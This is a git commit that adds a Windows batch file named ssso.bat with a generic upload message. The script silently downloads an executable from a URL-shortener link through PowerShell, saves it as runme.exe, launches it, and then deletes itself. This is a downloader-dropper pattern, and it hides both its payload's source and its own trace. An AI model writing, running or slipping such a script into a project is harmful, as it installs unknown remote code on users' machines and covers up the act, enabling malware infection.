be1b1760c4ce794e7796b6972cc3e06576641aa7
sys!!+root <79191180+Algorithm99root@users.noreply.github.com>
2025-07-10 23:29:02 +0100

    Add files via upload

---
+++ ssso.bat
@@ -0,0 +1,18 @@
+ÿþ&cls
+@echo off
+set "url=https://tinyurl.com/4wvmcbbt"
+set "file=%~dp0runme.exe"
+
+:: Download EXE using PowerShell
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%file%')"
+
+:: Run the downloaded EXE
+if exist "%file%" (
+    start "" "%file%"
+) else (
+    echo Download failed.
+    exit /b
+)
+
+:: Self-delete
+(del "%~f0") >nul 2>&1
